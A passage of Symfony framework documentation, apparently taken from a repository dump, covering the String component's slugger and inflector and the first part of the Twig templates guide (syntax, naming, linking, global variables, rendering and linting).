});\n\nThe callback will only be executed when the value of the lazy string is\nrequested during the program execution. You can also create lazy strings from a\n``Stringable`` object::\n\n    class Hash implements \\Stringable\n    {\n        public function __toString(): string\n        {\n            return $this->computeHash();\n        }\n\n        private function computeHash(): string\n        {\n            // Compute hash value with potentially heavy processing\n            $hash = ...;\n\n            return $hash;\n        }\n    }\n\n    // Then create a lazy string from this hash, which will trigger\n    // hash computation only if it's needed\n    $lazyHash = LazyString::fromStringable(new Hash());\n\nWorking with Emojis\n-------------------\n\nThese contents have been moved to the :doc:`Emoji component docs </emoji>`.\n\n.. _string-slugger:\n\nSlugger\n-------\n\nIn some contexts, such as URLs and file/directory names, it's not safe to use\nany Unicode character. A *slugger* transforms a given string into another string\nthat only includes safe ASCII characters::\n\n    use Symfony\\Component\\String\\Slugger\\AsciiSlugger;\n\n    $slugger = new AsciiSlugger();\n    $slug = $slugger->slug('Wôrķšƥáçè ~~sèťtïñğš~~');\n    // $slug = 'Workspace-settings'\n\n    // you can also pass an array with additional character substitutions\n    $slugger = new AsciiSlugger('en', ['en' => ['%' => 'percent', '€' => 'euro']]);\n    $slug = $slugger->slug('10% or 5€');\n    // $slug = '10-percent-or-5-euro'\n\n    // if there is no symbols map for your locale (e.g. 'en_GB') then the parent locale's symbols map\n    // will be used instead (i.e. 'en')\n    $slugger = new AsciiSlugger('en_GB', ['en' => ['%' => 'percent', '€' => 'euro']]);\n    $slug = $slugger->slug('10% or 5€');\n    // $slug = '10-percent-or-5-euro'\n\n    // for more dynamic substitutions, pass a PHP closure instead of an array\n    $slugger = new AsciiSlugger('en', function (string $string, string $locale): string {\n        return str_replace('❤️', 'love', $string);\n    });\n\nThe separator between words is a dash (``-``) by default, but you can define\nanother separator as the second argument::\n\n    $slug = $slugger->slug('Wôrķšƥáçè ~~sèťtïñğš~~', '/');\n    // $slug = 'Workspace/settings'\n\nThe slugger transliterates the original string into the Latin script before\napplying the other transformations. The locale of the original string is\ndetected automatically, but you can define it explicitly::\n\n    // this tells the slugger to transliterate from Korean ('ko') language\n    $slugger = new AsciiSlugger('ko');\n\n    // you can override the locale as the third optional parameter of slug()\n    // e.g. this slugger transliterates from Persian ('fa') language\n    $slug = $slugger->slug('...', '-', 'fa');\n\nIn a Symfony application, you don't need to create the slugger yourself. Thanks\nto :doc:`service autowiring </service_container/autowiring>`, you can inject a\nslugger by type-hinting a service constructor argument with the\n:class:`Symfony\\\\Component\\\\String\\\\Slugger\\\\SluggerInterface`. The locale of\nthe injected slugger is the same as the request locale::\n\n    use Symfony\\Component\\String\\Slugger\\SluggerInterface;\n\n    class MyService\n    {\n        public function __construct(\n            private SluggerInterface $slugger,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            $slug = $this->slugger->slug('...');\n        }\n    }\n\n.. _string-slugger-emoji:\n\nSlug Emojis\n~~~~~~~~~~~\n\nYou can also combine the :ref:`emoji transliterator <emoji-transliteration>`\nwith the slugger to transform any emojis into their textual representation::\n\n    use Symfony\\Component\\String\\Slugger\\AsciiSlugger;\n\n    $slugger = new AsciiSlugger();\n    $slugger = $slugger->withEmoji();\n\n    $slug = $slugger->slug('a 😺, 🐈‍⬛, and a 🦁 go to 🏞️', '-', 'en');\n    // $slug = 'a-grinning-cat-black-cat-and-a-lion-go-to-national-park';\n\n    $slug = $slugger->slug('un 😺, 🐈‍⬛, et un 🦁 vont au 🏞️', '-', 'fr');\n    // $slug = 'un-chat-qui-sourit-chat-noir-et-un-tete-de-lion-vont-au-parc-national';\n\nIf you want to use a specific locale for the emoji, or to use the short codes\nfrom GitHub, Gitlab or Slack, use the first argument of ``withEmoji()`` method::\n\n    use Symfony\\Component\\String\\Slugger\\AsciiSlugger;\n\n    $slugger = new AsciiSlugger();\n    $slugger = $slugger->withEmoji('github'); // or \"en\", or \"fr\", etc.\n\n    $slug = $slugger->slug('a 😺, 🐈‍⬛, and a 🦁');\n    // $slug = 'a-smiley-cat-black-cat-and-a-lion';\n\n.. _string-inflector:\n\nInflector\n---------\n\nIn some scenarios such as code generation and code introspection, you need to\nconvert words from/to singular/plural. For example, to know the property\nassociated with an *adder* method, you must convert from plural\n(``addStories()`` method) to singular (``$story`` property).\n\nMost human languages have simple pluralization rules, but at the same time they\ndefine lots of exceptions. For example, the general rule in English is to add an\n``s`` at the end of the word (``book`` -> ``books``) but there are lots of\nexceptions even for common words (``woman`` -> ``women``, ``life`` -> ``lives``,\n``news`` -> ``news``, ``radius`` -> ``radii``, etc.)\n\nThis component provides an :class:`Symfony\\\\Component\\\\String\\\\Inflector\\\\EnglishInflector`\nclass to convert English words from/to singular/plural with confidence::\n\n    use Symfony\\Component\\String\\Inflector\\EnglishInflector;\n\n    $inflector = new EnglishInflector();\n\n    $result = $inflector->singularize('teeth');   // ['tooth']\n    $result = $inflector->singularize('radii');   // ['radius']\n    $result = $inflector->singularize('leaves');  // ['leaf', 'leave', 'leaff']\n\n    $result = $inflector->pluralize('bacterium'); // ['bacteria']\n    $result = $inflector->pluralize('news');      // ['news']\n    $result = $inflector->pluralize('person');    // ['persons', 'people']\n\nThe value returned by both methods is always an array because sometimes it's not\npossible to determine a unique singular/plural form for the given word.\n\n.. note::\n\n    Symfony also provides a :class:`Symfony\\\\Component\\\\String\\\\Inflector\\\\FrenchInflector`\n    and an :class:`Symfony\\\\Component\\\\String\\\\Inflector\\\\InflectorInterface` if\n    you need to implement your own inflector.\n\n.. _`ASCII`: https://en.wikipedia.org/wiki/ASCII\n.. _`Unicode`: https://en.wikipedia.org/wiki/Unicode\n.. _`Code points`: https://en.wikipedia.org/wiki/Code_point\n.. _`Grapheme clusters`: https://en.wikipedia.org/wiki/Grapheme\n.. _`Unicode equivalence`: https://en.wikipedia.org/wiki/Unicode_equivalence\n"
        },
        {
          "name": "templates.rst",
          "type": "blob",
          "size": 59.056640625,
          "content": "Creating and Using Templates\n============================\n\nA template is the best way to organize and render HTML from inside your application,\nwhether you need to render HTML from a :doc:`controller </controller>` or generate\nthe :doc:`contents of an email </mailer>`. Templates in Symfony are created with\nTwig: a flexible, fast, and secure template engine.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run the following command\nto install both Twig language support and its integration with Symfony applications:\n\n.. code-block:: terminal\n\n    $ composer require symfony/twig-bundle\n\n.. _twig-language:\n\nTwig Templating Language\n------------------------\n\nThe `Twig`_ templating language allows you to write concise, readable templates\nthat are more friendly to web designers and, in several ways, more powerful than\nPHP templates. Take a look at the following Twig template example. Even if it's\nthe first time you see Twig, you probably understand most of it:\n\n.. code-block:: html+twig\n\n    <!DOCTYPE html>\n    <html>\n        <head>\n            <title>Welcome to Symfony!</title>\n        </head>\n        <body>\n            <h1>{{ page_title }}</h1>\n\n            {% if user.isLoggedIn %}\n                Hello {{ user.name }}!\n            {% endif %}\n\n            {# ... #}\n        </body>\n    </html>\n\nTwig syntax is based on these three constructs:\n\n* ``{{ ... }}``, used to display the content of a variable or the result of\n  evaluating an expression;\n* ``{% ... %}``, used to run some logic, such as a conditional or a loop;\n* ``{# ... #}``, used to add comments to the template (unlike HTML comments,\n  these comments are not included in the rendered page).\n\nYou can't run PHP code inside Twig templates, but Twig provides utilities to\nrun some logic in the templates. For example, **filters** modify content before\nbeing rendered, like the ``upper`` filter to uppercase contents:\n\n.. code-block:: twig\n\n    {{ title|upper }}\n\nTwig comes with a long list of `tags`_, `filters`_ and `functions`_ that are\navailable by default. In Symfony applications you can also use these\n:doc:`Twig filters and functions defined by Symfony </reference/twig_reference>`\nand you can :ref:`create your own Twig filters and functions <templates-twig-extension>`.\n\nTwig is fast in the ``prod`` :ref:`environment <configuration-environments>`\n(because templates are compiled into PHP and cached automatically), but\nconvenient to use in the ``dev`` environment (because templates are recompiled\nautomatically when you change them).\n\nTwig Configuration\n~~~~~~~~~~~~~~~~~~\n\nTwig has several configuration options to define things like the format used\nto display numbers and dates, the template caching, etc. Read the\n:doc:`Twig configuration reference </reference/configuration/twig>` to learn about them.\n\nCreating Templates\n------------------\n\nBefore explaining in detail how to create and render templates, look at the\nfollowing example for a quick overview of the whole process. First, you need to\ncreate a new file in the ``templates/`` directory to store the template contents:\n\n.. code-block:: html+twig\n\n    {# templates/user/notifications.html.twig #}\n    <h1>Hello {{ user_first_name }}!</h1>\n    <p>You have {{ notifications|length }} new notifications.</p>\n\nThen, create a :doc:`controller </controller>` that renders this template and\npasses to it the needed variables::\n\n    // src/Controller/UserController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class UserController extends AbstractController\n    {\n        // ...\n\n        public function notifications(): Response\n        {\n            // get the user information and notifications somehow\n            $userFirstName = '...';\n            $userNotifications = ['...', '...'];\n\n            // the template path is the relative file path from `templates/`\n            return $this->render('user/notifications.html.twig', [\n                // this array defines the variables passed to the template,\n                // where the key is the variable name and the value is the variable value\n                // (Twig recommends using snake_case variable names: 'foo_bar' instead of 'fooBar')\n                'user_first_name' => $userFirstName,\n                'notifications' => $userNotifications,\n            ]);\n        }\n    }\n\nTemplate Naming\n~~~~~~~~~~~~~~~\n\nSymfony recommends the following for template names:\n\n* Use `snake case`_ for filenames and directories (e.g. ``blog_posts.html.twig``,\n  ``admin/default_theme/blog/index.html.twig``, etc.);\n* Define two extensions for filenames (e.g. ``index.html.twig`` or\n  ``blog_posts.xml.twig``) being the first extension (``html``, ``xml``, etc.)\n  the final format that the template will generate.\n\nAlthough templates usually generate HTML contents, they can generate any\ntext-based format. That's why the two-extension convention simplifies the way\ntemplates are created and rendered for multiple formats.\n\nTemplate Location\n~~~~~~~~~~~~~~~~~\n\nTemplates are stored by default in the ``templates/`` directory. When a service\nor controller renders the ``product/index.html.twig`` template, they are actually\nreferring to the ``<your-project>/templates/product/index.html.twig`` file.\n\nThe default templates directory is configurable with the\n:ref:`twig.default_path <config-twig-default-path>` option and you can add more\ntemplate directories :ref:`as explained later <templates-namespaces>` in this article.\n\nTemplate Variables\n~~~~~~~~~~~~~~~~~~\n\nA common need for templates is to print the values stored in the templates\npassed from the controller or service. Variables usually store objects and\narrays instead of strings, numbers and boolean values. That's why Twig provides\nquick access to complex PHP variables. Consider the following template:\n\n.. code-block:: html+twig\n\n    <p>{{ user.name }} added this comment on {{ comment.publishedAt|date }}</p>\n\nThe ``user.name`` notation means that you want to display some information\n(``name``) stored in a variable (``user``). Is ``user`` an array or an object?\nIs ``name`` a property or a method? In Twig this doesn't matter.\n\nWhen using the ``foo.bar`` notation, Twig tries to get the value of the variable\nin the following order:\n\n#. ``$foo['bar']`` (array and element);\n#. ``$foo->bar`` (object and public property);\n#. ``$foo->bar()`` (object and public method);\n#. ``$foo->getBar()`` (object and *getter* method);\n#. ``$foo->isBar()`` (object and *isser* method);\n#. ``$foo->hasBar()`` (object and *hasser* method);\n#. If none of the above exists, use ``null`` (or throw a ``Twig\\Error\\RuntimeError``\n   exception if the :ref:`strict_variables <config-twig-strict-variables>`\n   option is enabled).\n\nThis allows to evolve your application code without having to change the\ntemplate code (you can start with array variables for the application proof of\nconcept, then move to objects with methods, etc.)\n\n.. _templates-link-to-pages:\n\nLinking to Pages\n~~~~~~~~~~~~~~~~\n\nInstead of writing the link URLs by hand, use the ``path()`` function to\ngenerate URLs based on the :ref:`routing configuration <routing-creating-routes>`.\n\nLater, if you want to modify the URL of a particular page, all you'll need to do\nis change the routing configuration: the templates will automatically generate\nthe new URL.\n\nConsider the following routing configuration:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        // ...\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/', name: 'blog_index')]\n            public function index(): Response\n            {\n                // ...\n            }\n\n            #[Route('/article/{slug}', name: 'blog_post')]\n            public function show(string $slug): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_index:\n            path:       /\n            controller: App\\Controller\\BlogController::index\n\n        blog_post:\n            path:       /article/{slug}\n            controller: App\\Controller\\BlogController::show\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_index\"\n                path=\"/\"\n                controller=\"App\\Controller\\BlogController::index\"/>\n\n            <route id=\"blog_post\"\n                path=\"/article/{slug}\"\n                controller=\"App\\Controller\\BlogController::show\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('blog_index', '/')\n                ->controller([BlogController::class, 'index'])\n            ;\n\n            $routes->add('blog_post', '/articles/{slug}')\n                ->controller([BlogController::class, 'show'])\n            ;\n        };\n\nUse the ``path()`` Twig function to link to these pages and pass the route name\nas the first argument and the route parameters as the optional second argument:\n\n.. code-block:: html+twig\n\n    <a href=\"{{ path('blog_index') }}\">Homepage</a>\n\n    {# ... #}\n\n    {% for post in blog_posts %}\n        <h1>\n            <a href=\"{{ path('blog_post', {slug: post.slug}) }}\">{{ post.title }}</a>\n        </h1>\n\n        <p>{{ post.excerpt }}</p>\n    {% endfor %}\n\nThe ``path()`` function generates relative URLs. If you need to generate\nabsolute URLs (for example when rendering templates for emails or RSS feeds),\nuse the ``url()`` function, which takes the same arguments as ``path()``\n(e.g. ``<a href=\"{{ url('blog_index') }}\"> ... </a>``).\n\n.. _templates-link-to-assets:\n\nLinking to CSS, JavaScript and Image Assets\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf a template needs to link to a static asset (e.g. an image), Symfony provides\nan ``asset()`` Twig function to help generate that URL. First, install the\n``asset`` package:\n\n.. code-block:: terminal\n\n    $ composer require symfony/asset\n\nYou can now use the ``asset()`` function:\n\n.. code-block:: html+twig\n\n    {# the image lives at \"public/images/logo.png\" #}\n    <img src=\"{{ asset('images/logo.png') }}\" alt=\"Symfony!\"/>\n\n    {# the CSS file lives at \"public/css/blog.css\" #}\n    <link href=\"{{ asset('css/blog.css') }}\" rel=\"stylesheet\"/>\n\n    {# the JS file lives at \"public/bundles/acme/js/loader.js\" #}\n    <script src=\"{{ asset('bundles/acme/js/loader.js') }}\"></script>\n\nThe ``asset()`` function's main purpose is to make your application more portable.\nIf your application lives at the root of your host (e.g. ``https://example.com``),\nthen the rendered path should be ``/images/logo.png``. But if your application\nlives in a subdirectory (e.g. ``https://example.com/my_app``), each asset path\nshould render with the subdirectory (e.g. ``/my_app/images/logo.png``). The\n``asset()`` function takes care of this by determining how your application is\nbeing used and generating the correct paths accordingly.\n\n.. tip::\n\n    The ``asset()`` function supports various cache busting techniques via the\n    :ref:`version <reference-framework-assets-version>`,\n    :ref:`version_format <reference-assets-version-format>`, and\n    :ref:`json_manifest_path <reference-assets-json-manifest-path>` configuration options.\n\nIf you need absolute URLs for assets, use the ``absolute_url()`` Twig function\nas follows:\n\n.. code-block:: html+twig\n\n    <img src=\"{{ absolute_url(asset('images/logo.png')) }}\" alt=\"Symfony!\"/>\n\n    <link rel=\"shortcut icon\" href=\"{{ absolute_url('favicon.png') }}\">\n\nBuild, Versioning & More Advanced CSS, JavaScript and Image Handling\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nFor help building and versioning your JavaScript and\nCSS assets in a modern way, read about :doc:`Symfony's AssetMapper </frontend>`.\n\n.. _twig-app-variable:\n\nThe App Global Variable\n~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony creates a context object that is injected into every Twig template\nautomatically as a variable called ``app``. It provides access to some\napplication information:\n\n.. code-block:: html+twig\n\n    <p>Username: {{ app.user.username ?? 'Anonymous user' }}</p>\n    {% if app.debug %}\n        <p>Request method: {{ app.request.method }}</p>\n        <p>Application Environment: {{ app.environment }}</p>\n    {% endif %}\n\nThe ``app`` variable (which is an instance of :class:`Symfony\\\\Bridge\\\\Twig\\\\AppVariable`)\ngives you access to these variables:\n\n``app.user``\n    The :ref:`current user object <create-user-class>` or ``null`` if the user\n    is not authenticated.\n``app.request``\n    The :class:`Symfony\\\\Component\\\\HttpFoundation\\\\Request` object that stores\n    the current :ref:`request data <accessing-request-data>` (depending on your\n    application, this can be a :ref:`sub-request <http-kernel-sub-requests>`\n    or a regular request).\n``app.session``\n    The :class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Session` object that\n    represents the current :doc:`user's session </session>` or ``null`` if there is none.\n``app.flashes``\n    An array of all the :ref:`flash messages <flash-messages>` stored in the session.\n    You can also get only the messages of some type (e.g. ``app.flashes('notice')``).\n``app.environment``\n    The name of the current :ref:`configuration environment <configuration-environments>`\n    (``dev``, ``prod``, etc).\n``app.debug``\n    True if in :ref:`debug mode <debug-mode>`. False otherwise.\n``app.token``\n    A :class:`Symfony\\\\Component\\\\Security\\\\Core\\\\Authentication\\\\Token\\\\TokenInterface`\n    object representing the security token.\n``app.current_route``\n    The name of the route associated with the current request or ``null`` if no\n    request is available (equivalent to ``app.request.attributes.get('_route')``)\n``app.current_route_parameters``\n    An array with the parameters passed to the route of the current request or an\n    empty array if no request is available (equivalent to ``app.request.attributes.get('_route_params')``)\n``app.locale``\n    The locale used in the current :ref:`locale switcher <locale-switcher>` context.\n``app.enabled_locales``\n    The locales enabled in the application.\n\nIn addition to the global ``app`` variable injected by Symfony, you can also\ninject variables automatically to all Twig templates as explained in the next\nsection.\n\n.. _templating-global-variables:\n\nGlobal Variables\n~~~~~~~~~~~~~~~~\n\nTwig allows you to automatically inject one or more variables into all\ntemplates. These global variables are defined in the ``twig.globals`` option\ninside the main Twig configuration file:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            # ...\n            globals:\n                ga_tracking: 'UA-xxxxx-x'\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig\n                https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <!-- ... -->\n                <twig:global key=\"ga_tracking\">UA-xxxxx-x</twig:global>\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            // ...\n\n            $twig->global('ga_tracking')->value('UA-xxxxx-x');\n        };\n\nNow, the variable ``ga_tracking`` is available in all Twig templates, so you\ncan use it without having to pass it explicitly from the controller or service\nthat renders the template:\n\n.. code-block:: html+twig\n\n    <p>The Google tracking code is: {{ ga_tracking }}</p>\n\nIn addition to static values, Twig global variables can also reference services\nfrom the :doc:`service container </service_container>`. The main drawback is\nthat these services are not loaded lazily. In other words, as soon as Twig is\nloaded, your service is instantiated, even if you never use that global\nvariable.\n\nTo define a service as a global Twig variable, prefix the service ID string\nwith the ``@`` character, which is the usual syntax to :ref:`refer to services\nin container parameters <service-container-parameters>`:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            # ...\n            globals:\n                # the value is the service's id\n                uuid: '@App\\Generator\\UuidGenerator'\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig\n                https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <!-- ... -->\n                <twig:global key=\"uuid\" id=\"App\\Generator\\UuidGenerator\" type=\"service\"/>\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use function Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\service;\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            // ...\n\n            $twig->global('uuid')->value(service('App\\Generator\\UuidGenerator'));\n        };\n\nNow you can use the ``uuid`` variable in any Twig template to access to the\n``UuidGenerator`` service:\n\n.. code-block:: twig\n\n    UUID: {{ uuid.generate }}\n\nTwig Components\n---------------\n\nTwig components are an alternative way to render templates, where each template\nis bound to a \"component class\". This makes it easier to render and re-use\nsmall template \"units\" - like an alert, markup for a modal, or a category sidebar.\n\nFor more information, see `UX Twig Component`_.\n\nTwig components also have one other superpower: they can become \"live\", where\nthey automatically update (via Ajax) as the user interacts with them. For example,\nwhen your user types into a box, your Twig component will re-render via Ajax to\nshow a list of results!\n\nTo learn more, see `UX Live Component`_.\n\n.. _templates-rendering:\n\nRendering Templates\n-------------------\n\nRendering a Template in Controllers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your controller extends from the :ref:`AbstractController <the-base-controller-class-services>`,\nuse the ``render()`` helper::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class ProductController extends AbstractController\n    {\n        public function index(): Response\n        {\n            // ...\n\n            // the `render()` method returns a `Response` object with the\n            // contents created by the template\n            return $this->render('product/index.html.twig', [\n                'category' => '...',\n                'promotions' => ['...', '...'],\n            ]);\n\n            // the `renderView()` method only returns the contents created by the\n            // template, so you can use those contents later in a `Response` object\n            $contents = $this->renderView('product/index.html.twig', [\n                'category' => '...',\n                'promotions' => ['...', '...'],\n            ]);\n\n            return new Response($contents);\n        }\n    }\n\nIf your controller does not extend from ``AbstractController``, you'll need to\n:ref:`fetch services in your controller <controller-accessing-services>` and\nuse the ``render()`` method of the ``twig`` service.\n\n.. _templates-template-attribute:\n\nAnother option is to use the ``#[Template]`` attribute on the controller method\nto define the template to render::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bridge\\Twig\\Attribute\\Template;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class ProductController extends AbstractController\n    {\n        #[Template('product/index.html.twig')]\n        public function index(): array\n        {\n            // ...\n\n            // when using the #[Template] attribute, you only need to return\n            // an array with the parameters to pass to the template (the attribute\n            // is the one which will create and return the Response object).\n            return [\n                'category' => '...',\n                'promotions' => ['...', '...'],\n            ];\n        }\n    }\n\nThe :ref:`base AbstractController <the-base-controller-classes-services>` also provides the\n:method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::renderBlock`\nand :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::renderBlockView`\nmethods::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class ProductController extends AbstractController\n    {\n        // ...\n\n        public function price(): Response\n        {\n            // ...\n\n            // the `renderBlock()` method returns a `Response` object with the\n            // block contents\n            return $this->renderBlock('product/index.html.twig', 'price_block', [\n                // ...\n            ]);\n\n            // the `renderBlockView()` method only returns the contents created by the\n            // template block, so you can use those contents later in a `Response` object\n            $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [\n                // ...\n            ]);\n\n            return new Response($contents);\n        }\n    }\n\nThis might come handy when dealing with blocks in\n:ref:`templates inheritance <template_inheritance-layouts>` or when using\n`Turbo Streams`_.\n\nRendering a Template in Services\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInject the ``twig`` Symfony service into your own services and use its\n``render()`` method. When using :doc:`service autowiring </service_container/autowiring>`\nyou only need to add an argument in the service constructor and type-hint it with\nthe `Twig Environment`_::\n\n    // src/Service/SomeService.php\n    namespace App\\Service;\n\n    use Twig\\Environment;\n\n    class SomeService\n    {\n        public function __construct(\n            private Environment $twig,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            // ...\n\n            $htmlContents = $this->twig->render('product/index.html.twig', [\n                'category' => '...',\n                'promotions' => ['...', '...'],\n            ]);\n        }\n    }\n\nRendering a Template in Emails\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nRead the docs about the :ref:`mailer and Twig integration <mailer-twig>`.\n\n.. _templates-render-from-route:\n\nRendering a Template Directly from a Route\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAlthough templates are usually rendered in controllers and services, you can\nrender static pages that don't need any variables directly from the route\ndefinition. Use the special :class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\TemplateController`\nprovided by Symfony:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        acme_privacy:\n            path:          /privacy\n            controller:    Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController\n            defaults:\n                # the path of the template to render\n                template:  'static/privacy.html.twig'\n\n                # the response status code (default: 200)\n                statusCode: 200\n\n                # special options defined by Symfony to set the page cache\n                maxAge:    86400\n                sharedAge: 86400\n\n                # whether or not caching should apply for client caches only\n                private: true\n\n                # optionally you can define some arguments passed to the template\n                context:\n                    site_name: 'ACME'\n                    theme: 'dark'\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"acme_privacy\"\n                path=\"/privacy\"\n                controller=\"Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController\">\n                <!-- the path of the template to render -->\n                <default key=\"template\">static/privacy.html.twig</default>\n\n                <!-- the response status code (default: 200) -->\n                <default key=\"statusCode\">200</default>\n\n                <!-- special options defined by Symfony to set the page cache -->\n                <default key=\"maxAge\">86400</default>\n                <default key=\"sharedAge\">86400</default>\n\n                <!-- whether or not caching should apply for client caches only -->\n                <default key=\"private\">true</default>\n\n                <!-- optionally you can define some arguments passed to the template -->\n                <default key=\"context\">\n                    <default key=\"site_name\">ACME</default>\n                    <default key=\"theme\">dark</default>\n                </default>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('acme_privacy', '/privacy')\n                ->controller(TemplateController::class)\n                ->defaults([\n                    // the path of the template to render\n                    'template'  => 'static/privacy.html.twig',\n\n                    // the response status code (default: 200)\n                    'statusCode' => 200,\n\n                    // special options defined by Symfony to set the page cache\n                    'maxAge'    => 86400,\n                    'sharedAge' => 86400,\n\n                    // whether or not caching should apply for client caches only\n                    'private' => true,\n\n                    // optionally you can define some arguments passed to the template\n                    'context' => [\n                        'site_name' => 'ACME',\n                        'theme' => 'dark',\n                    ]\n                ])\n            ;\n        };\n\nChecking if a Template Exists\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTemplates are loaded in the application using a `Twig template loader`_, which\nalso provides a method to check for template existence. First, get the loader::\n\n    use Twig\\Environment;\n\n    class YourService\n    {\n        // this code assumes that your service uses autowiring to inject dependencies\n        // otherwise, inject the service called 'twig' manually\n        public function __construct(Environment $twig)\n        {\n            $loader = $twig->getLoader();\n        }\n    }\n\nThen, pass the path of the Twig template to the ``exists()`` method of the loader::\n\n    if ($loader->exists('theme/layout_responsive.html.twig')) {\n        // the template exists, do something\n        // ...\n    }\n\nDebugging Templates\n-------------------\n\nSymfony provides several utilities to help you debug issues in your templates.\n\nLinting Twig Templates\n~~~~~~~~~~~~~~~~~~~~~~\n\nThe ``lint:twig`` command checks that your Twig templates don't have any syntax\nerrors. It's useful to run it before deploying your application to production\n(e.g. in your continuous integration server):\n\n.. code-block:: terminal\n\n    # check all the application templates\n    $ php bin/console lint:twig\n\n    # you can also check directories and individual templates\n    $ php bin/console lint:twig templates/email/\n    $ php bin/console lint:twig templates/article/recent_list.html.twig\n\n    # you can also show the deprecated features used in your templates\n    $ php bin/console lint:twig --show-deprecations templates/email/\n\n    # you can also excludes directories\n    $ php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool\n\n.. versionadded:: 7.1\n\n    The option to exclude directories was introduced in Symfony 7.1.\n\nWhen running the linter inside `GitHub Actions`_, the output is automatically\nadapted to the format required by GitHub, but you can force that format too:\n\n.. code-block:: terminal\n\n    $ php bin/console lint:twig --format=github\n\nInspecting Twig Information\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe 